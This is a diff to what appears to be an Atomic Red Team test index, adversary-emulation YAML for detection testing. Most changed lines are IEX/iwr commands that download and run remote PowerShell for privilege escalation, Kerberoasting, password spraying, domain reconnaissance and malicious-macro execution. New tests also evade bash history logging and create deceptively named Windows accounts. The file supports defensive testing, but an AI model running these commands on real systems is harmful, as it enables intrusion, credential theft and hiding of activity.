@@ -5831,8 +5831,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
   T1055:
@@ -5965,7 +5965,7 @@ privilege-escalation:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
@@ -6782,8 +6782,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
   T1053:
@@ -8131,8 +8131,8 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique NamedPipe -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -8143,8 +8143,8 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique Token -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1546.005:
@@ -15958,8 +15958,8 @@ persistence:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
   T1053:
@@ -18829,7 +18829,7 @@ credential-access:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
         cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
           Ignore
@@ -19971,7 +19971,7 @@ credential-access:
       - windows
       executor:
         command: |
-          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
   T1555.001:
@@ -20486,7 +20486,7 @@ credential-access:
 '
         get_prereq_command: |
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
             Expand-Archive $zippath $parentpath\wce -Force
             Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
@@ -22079,8 +22079,9 @@ credential-access:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'');
-          Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1''
+          -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain
+          #{domain} -Force
 
 '
     - name: Password spray all domain users with a single password via LDAP against
@@ -23961,7 +23962,7 @@ collection:
       executor:
         command: |
           Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt"
           -ErrorAction Ignore
@@ -27266,7 +27267,6 @@ defense-evasion:
 '
       supported_platforms:
       - linux
-      - macos
       executor:
         command: 'echo "" > ~/.bash_history
 
@@ -27358,6 +27358,33 @@ defense-evasion:
         command: |
           hostname
           whoami
+        name: sh
+    - name: Disable Bash History Logging with SSH -T
+      auto_generated_guid: 5f8abd62-f615-43c5-b6be-f780f25790a1
+      description: 'Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T
+        keeps the ssh client from catching a proper TTY, which is what usually gets
+        logged on lastlog
+
+'
+      supported_platforms:
+      - linux
+      dependencies:
+      - description: 'Install sshpass and create user account used for excuting
+
+'
+        prereq_command: |
+          /usr/sbin/useradd testuser1
+          echo pwd101! | passwd testuser1 --stdin
+        get_prereq_command: |
+          yum -y install epel-release
+          yum -y install sshpass
+      executor:
+        command: 'sshpass -p ''pwd101!'' ssh testuser1@localhost -T hostname
+
+'
+        cleanup_command: 'userdel -f testuser1
+
+'
         name: sh
     - name: Prevent Powershell History Logging
       auto_generated_guid: 2f898b81-3e97-4abb-bc3f-a95138988370
@@ -27601,7 +27628,7 @@ defense-evasion:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
         elevation_required: true
@@ -31771,12 +31798,33 @@ defense-evasion:
         command: |
           $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
           $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
         cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
 
 '
         name: powershell
+    - name: Create a user called "$" as noted here
+      auto_generated_guid: 2ec63cc2-4975-41a6-bf09-dffdfb610778
+      description: Creating a user with a username containing "$"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: net user $ ATOMIC123! /add /active:yes
+        cleanup_command: net user $ /DELETE 2>&1
+    - name: Create an "Administrator " user (with a space on the end)
+      auto_generated_guid: 5bb20389-39a5-4e99-9264-aeb92a55a85c
+      description: Creating a user with a username containing with a space on the
+        end
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-LocalUser -Name "Administrator " -NoPassword
+        cleanup_command: Remove-LocalUser -Name "Administrator " 2>&1 | out-null
   T1574:
     technique:
       external_references:
@@ -37285,8 +37333,8 @@ defense-evasion:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
   T1055:
@@ -37419,7 +37467,7 @@ defense-evasion:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
@@ -41527,8 +41575,8 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique NamedPipe -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -41539,8 +41587,8 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique Token -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1205:
@@ -45829,8 +45877,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Find-LocalAdminAccess -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-LocalAdminAccess -Verbose
 
 '
         name: powershell
@@ -45844,8 +45892,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Invoke-EnumerateLocalAdmin  -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
 
 '
         name: powershell
@@ -45863,8 +45911,9 @@ discovery:
           type: Path
           default: "$env:COMPUTERNAME"
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose'
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name}
+          -Verbose'
         name: powershell
     - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
       auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
@@ -46904,8 +46953,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Find-DomainShare -CheckShareAccess -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
 
 '
         name: powershell
@@ -48827,8 +48876,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Invoke-UserHunter -Stealth -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
 
 '
         name: powershell
@@ -53432,7 +53481,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
@@ -53493,7 +53542,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -53531,7 +53580,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         name: powershell
@@ -53568,7 +53617,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
         name: powershell
@@ -53702,7 +53751,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
   T1204.001:
@@ -54690,8 +54739,8 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
   T1053:
@@ -55550,7 +55599,7 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
         cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
           -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
@@ -55587,8 +55636,8 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
           -officeProduct \"Word\" -sub \"Extract\"\n"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin"
           -ErrorAction Ignore
@@ -62673,7 +62722,7 @@ initial-access:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
